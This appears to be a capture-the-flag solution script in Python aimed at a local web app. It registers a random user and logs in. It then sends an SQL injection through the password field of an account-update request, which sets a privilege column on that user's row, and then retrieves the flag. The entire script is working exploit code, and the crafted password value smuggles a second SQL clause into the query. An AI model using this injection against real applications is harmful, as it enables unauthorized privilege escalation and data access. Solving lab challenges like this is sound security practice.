import requests
import random


url = "http://localhost"
username = f"pkemkes{random.randint(0, 10**10)}"
password = f"pkemkes{random.randint(0, 10**10)}"

r = requests.post(url + "/signup", data={
    "username": username,
    "password": password
})
print(r.text)

r = requests.post(url + "/login", data={
    "username": username,
    "password": password
})
print(r.text)
headers = {"Authorization": r.json()["token"]}

r = requests.get(url + "/account", headers=headers)
print(r.text)

r = requests.get(url + "/flag", headers=headers)
print(r.text)

r = requests.post(url + "/account/update", headers=headers, data={
    "username": username,
    "password": password + f"\", sus=1 WHERE username = \"{username}\"; -- "
})
print(r.text)

r = requests.get(url + "/account", headers=headers)
print(r.text)

r = requests.get(url + "/flag", headers=headers)
print(r.text)
